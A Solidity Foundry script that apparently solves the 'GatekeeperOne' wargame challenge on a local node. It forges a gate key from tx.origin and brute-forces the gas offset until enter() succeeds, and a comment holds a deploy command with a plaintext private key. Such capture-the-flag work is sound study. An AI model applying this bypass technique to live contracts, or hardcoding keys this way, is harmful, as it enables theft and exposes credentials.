// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

contract Helper {

    function _makeKey(address origin_) internal pure returns (bytes8) {
        uint64 key64 = (uint64(1) << 32) | uint64(uint16(uint160(origin_)));
        return bytes8(key64);
    }


    function trigger(address target, address tx_origin) public {
        console.log("my answer");
        console.logBytes8(_makeKey(tx_origin));

        bytes8 _gateKey = _makeKey(tx_origin);
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");

        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

        bool res;
        for(uint i=0;i<10000000000000000;i++) {
            (res, ) = target.call{gas:(8191*10) + i}(abi.encodeWithSelector(ITarget.enter.selector, _gateKey));
            if(res==true)
                break;
        }
        console.log("End!");
    }

}
contract SolveScript is Script {
    address public target = 0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        address myAddr = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;
        Helper helper = new Helper();
        helper.trigger(target, myAddr);
        console.log("entrant address : %s", ITarget(target).entrant());
        vm.stopBroadcast();
    }
}
